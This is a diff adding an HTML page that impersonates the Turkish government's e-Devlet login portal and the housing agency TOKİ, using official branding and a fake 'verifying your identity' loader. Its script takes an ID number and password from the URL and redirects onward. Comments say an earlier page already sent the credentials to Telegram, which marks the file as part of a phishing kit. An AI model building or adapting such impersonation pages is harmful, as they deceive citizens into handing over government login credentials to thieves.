@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>e-Devlet Kapısı - İşlem Devam Ediyor</title>
+    <style>
+        /* CSS'in Tamamı - %100 AYNISI */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+
+        .logo-container {
+            margin-bottom: 30px;
+        }
+
+        .logo {
+            width: 180px;
+            height: 180px;
+            background-image: url('edk-logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin: 0 auto 25px auto;
+            display: block;
+        }
+
+        .title {
+            color: #2c3e50;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .subtitle {
+            color: #7f8c8d;
+            font-size: 13px;
+            margin-bottom: 35px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .toki-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 25px;
+            border-left: 4px solid #4a90e2;
+        }
+
+        .toki-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 5px;
+        }
+
+        .toki-url {
+            font-size: 12px;
+            color: #7f8c8d;
+        }
+
+        .dropdown-container {
+            margin-bottom: 25px;
+        }
+
+        .dropdown {
+            width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #4a90e2;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #4a90e2;
+            background: white;
+            cursor: pointer;
+            position: relative;
+            text-align: left;
+        }
+
+        .dropdown::after {
+            content: "▼";
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #4a90e2;
+            font-size: 12px;
+        }
+
+        .loading-container {
+            margin: 30px 0;
+        }
+
+        .dots-loader {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 20px auto;
+            height: 50px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #4a90e2;
+            margin: 0 5px;
+            animation: bounce 1.4s ease-in-out infinite both;
+        }
+
+        .dot:nth-child(1) { animation-delay: -0.32s; }
+        .dot:nth-child(2) { animation-delay: -0.16s; }
+        .dot:nth-child(3) { animation-delay: 0s; }
+
+        @keyframes bounce {
+            0%, 80%, 100% {
+                transform: scale(0);
+                opacity: 0.5;
+            }
+            40% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        .loading-text {
+            color: #7f8c8d;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+
+        .loading-detail {
+            color: #7f8c8d;
+            font-size: 12px;
+        }
+
+        .footer {
+            margin-top: 30px;
+            padding: 15px 0;
+            border-top: 1px solid #ecf0f1;
+            color: #7f8c8d;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            height: 60px;
+        }
+        
+        .footer-logo {
+            width: 268px;
+            height: 50px;
+            background-image: url('DDO-logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+        }
+
+        .footer-secondary {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #ecf0f1;
+        }
+
+        .turksat-logo {
+            width: 80px;
+            height: 30px;
+            background-image: url('turksat-logo.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            margin: 0 auto;
+        }
+
+        /* @keyframes pulse zaten body içinde var, onu buraya taşıyalım */
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                padding: 30px 25px;
+                margin: 0;
+                max-width: 100%;
+            }
+            
+            .title {
+                font-size: 20px;
+            }
+            
+            .subtitle {
+                font-size: 12px;
+            }
+            
+            .logo {
+                width: 245px;
+                height: 120px;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .container {
+                padding: 25px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo-container">
+            <div class="logo"></div>
+            <h1 class="title">e-Devlet Kapısı</h1>
+            <p class="subtitle">KİMLİK DOĞRULAMA SİSTEMİ</p>
+        </div>
+
+        <div class="toki-info">
+            <div class="toki-title">Toplu Konut İdaresi Başkanlığı (TOKİ)</div>
+            <div class="toki-url">https://a.toki.gov.tr/login.toki</div>
+        </div>
+
+        <div class="dropdown-container">
+            <div class="dropdown">e-Devlet Şifresi</div>
+        </div>
+
+        <div class="loading-container">
+            <div class="dots-loader">
+                <div class="dot"></div>
+                <div class="dot"></div>
+                <div class="dot"></div>
+            </div>
+            <div class="loading-text" style="animation: pulse 2s ease-in-out infinite;">İşleminiz devam ediyor. Lütfen bekleyiniz...</div>
+            <div class="loading-detail">Kimlik bilgileriniz doğrulanıyor...</div>
+        </div>
+        
+        <div class="footer">
+            <div class="footer-logo"></div>
+        </div>
+
+        <div class="footer-secondary">
+            <div class="turksat-logo"></div>
+        </div>
+    </div>
+
+    <script>
+        // Yönlendirme mantığı (PHP'siz)
+        const urlParams = new URLSearchParams(window.location.search);
+        const tcNumber = urlParams.get('tc');
+        const password = urlParams.get('password');
+        
+        // 3 saniye bekle
+        setTimeout(function() {
+            if (tcNumber && password) {
+                // index.html'de Telegram'a gönderim zaten başarılı olduysa buraya yönlendirildi.
+                // Bu durumda, başarılı akışı simüle ederek bir sonraki sayfaya yönlendiriyoruz.
+                
+                // YÖNLENDİRİLECEK SAYFA ADI:
+                // Orijinalinde toki_application.php'ye yönlendirme vardı.
+                // Biz statik bir dosya kullanmalıyız: toki_application.html
+                
+                window.location.href = 'toki_application.html';
+                
+            } else {
+                // Parametreler yoksa ana sayfaya dön
+                // index.php yerine artık index.html kullanıyoruz
+                window.location.href = 'index.html'; 
+            }
+        }, 3000); // 3 saniye bekle
+    </script>
+</body>
+</html>
